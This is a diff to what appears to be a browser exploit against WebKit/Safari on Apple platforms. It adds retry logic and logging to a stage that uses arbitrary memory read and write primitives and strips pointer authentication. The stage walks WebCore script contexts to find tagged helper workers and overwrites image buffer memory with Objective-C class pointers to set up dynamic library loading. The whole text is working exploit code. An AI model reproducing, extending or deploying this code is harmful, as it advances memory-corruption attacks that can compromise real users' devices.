@@ -9674,39 +9674,68 @@ async function main() {
           const {
             offsets
           } = p;
-          const contexts = p.read64(offsets.WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts);
-          print(`contexts: ${contexts.hex()}`);
-          const contexts_length = p.read64(contexts - 8n) >> 32n;
-          print(`contexts_length: ${contexts_length.hex()}`);
-          const dlopen_workers = [];
-          p.dlopen_workers = dlopen_workers;
-          for (let i = 0n; i < contexts_length; ++i) {
-            const ptr = contexts + i * 0x30n;
-            const key = p.read64(ptr);
-            if (!key) continue;
-            const context = p.read64(ptr + 0x20n);
-            const vtable = p.read64(context).noPAC();
-            if (vtable != offsets.WebCore__DedicatedWorkerGlobalScope_vtable) continue;
-            const script = p.read64(context + 0x150n);
-            const workerOrWorkletThread = p.read64(context + 0x160n);
-            const thread = p.read64(workerOrWorkletThread + 0x28n);
-            const Strong_globalScopeWrapper = p.read64(script + 0x20n);
-            const globalScopeWrapper = p.read64(Strong_globalScopeWrapper);
-            const butterfly = p.read64(globalScopeWrapper + 8n);
-            const id = p.read64(butterfly);
-            const bitmap = p.read64(butterfly + 8n);
-            if (id == 0xfffe000011111111n || id == 0xfffe000022222222n) {
-              p.dlopen_workers.push({
-                thread: thread,
-                id: id,
-                bitmap: bitmap
-              });
-            } else if (id == 0xfffe000033333333n) {
-              p.sub_worker = {
-                thread: thread,
-                id: id
-              };
+          const expected_worker_ids = [0xfffe000011111111n, 0xfffe000022222222n];
+          let dlopen_workers = [];
+          let last_discovered_workers = [];
+          const discovery_attempts = 8;
+          for (let attempt = 1; attempt <= discovery_attempts; ++attempt) {
+            const contexts = p.read64(offsets.WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts);
+            const contexts_length = p.read64(contexts - 8n) >> 32n;
+            print(`[DLOPEN] discovery attempt=${attempt}/${discovery_attempts} contexts=${contexts.hex()} length=${contexts_length.hex()}`);
+            const found_workers = [];
+            for (let i = 0n; i < contexts_length; ++i) {
+              const ptr = contexts + i * 0x30n;
+              const key = p.read64(ptr);
+              if (!key) continue;
+              const context = p.read64(ptr + 0x20n);
+              const vtable = p.read64(context).noPAC();
+              if (vtable != offsets.WebCore__DedicatedWorkerGlobalScope_vtable) continue;
+              const script = p.read64(context + 0x150n);
+              const workerOrWorkletThread = p.read64(context + 0x160n);
+              const thread = p.read64(workerOrWorkletThread + 0x28n);
+              const Strong_globalScopeWrapper = p.read64(script + 0x20n);
+              const globalScopeWrapper = p.read64(Strong_globalScopeWrapper);
+              const butterfly = p.read64(globalScopeWrapper + 8n);
+              const id = p.read64(butterfly);
+              const bitmap = p.read64(butterfly + 8n);
+              if (id == expected_worker_ids[0] || id == expected_worker_ids[1]) {
+                found_workers.push({
+                  thread: thread,
+                  id: id,
+                  bitmap: bitmap
+                });
+              } else if (id == 0xfffe000033333333n) {
+                p.sub_worker = {
+                  thread: thread,
+                  id: id
+                };
+              }
             }
+            const worker1 = found_workers.find(worker => worker.id == expected_worker_ids[0]);
+            const worker2 = found_workers.find(worker => worker.id == expected_worker_ids[1]);
+            last_discovered_workers = found_workers;
+            const found_ids = found_workers.map(worker => worker.id.hex()).join(',');
+            print(`[DLOPEN] discovery result count=${found_workers.length} ids=${found_ids || '(none)'}`);
+            if (worker1 && worker2) {
+              dlopen_workers = [worker1, worker2];
+              break;
+            }
+            if (attempt < discovery_attempts) await new Promise(resolve => setTimeout(resolve, 25));
+          }
+          if (dlopen_workers.length !== 2) {
+            const found_ids = last_discovered_workers.map(worker => worker.id.hex()).join(',');
+            const error = `[DLOPEN] expected both helper workers, found ${last_discovered_workers.length} ids=${found_ids || '(none)'}`;
+            print(error, true);
+            self.postMessage({
+              type: 'stage1_failed',
+              error: error
+            });
+            break;
+          }
+          p.dlopen_workers = dlopen_workers;
+          for (let i = 0; i < dlopen_workers.length; ++i) {
+            const worker = dlopen_workers[i];
+            print(`[DLOPEN] helper index=${i} id=${worker.id.hex()} thread=${worker.thread.hex()} bitmap=${worker.bitmap.hex()}`);
           }
           const defaultLoader = p.read64(offsets.AXCoreUtilities__DefaultLoader);
           print(`defaultLoader: ${defaultLoader.hex()}`);
@@ -9725,10 +9754,12 @@ async function main() {
           for (let i = 0; i < 2; ++i) {
             const worker = dlopen_workers[i];
             const wrappedBitmap = p.read64(worker.bitmap + 0x18n);
-            print(`wrappedBitmap: ${wrappedBitmap.hex()}`);
+            print(`[DLOPEN] class-write index=${i} wrappedBitmap=${wrappedBitmap.hex()}`);
             const imageBuffer = p.read64(wrappedBitmap + 0x10n);
-            print(`imageBuffer: ${imageBuffer.hex()}`);
-            p.write64(imageBuffer + 0x20n, classes[i]);
+            const target = imageBuffer + 0x20n;
+            print(`[DLOPEN] class-write begin index=${i} imageBuffer=${imageBuffer.hex()} target=${target.hex()} value=${classes[i].hex()}`);
+            p.write64(target, classes[i]);
+            print(`[DLOPEN] class-write done index=${i}`);
           }
           print('Load TextToSpeech');
           await loadObjcClass(offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest);
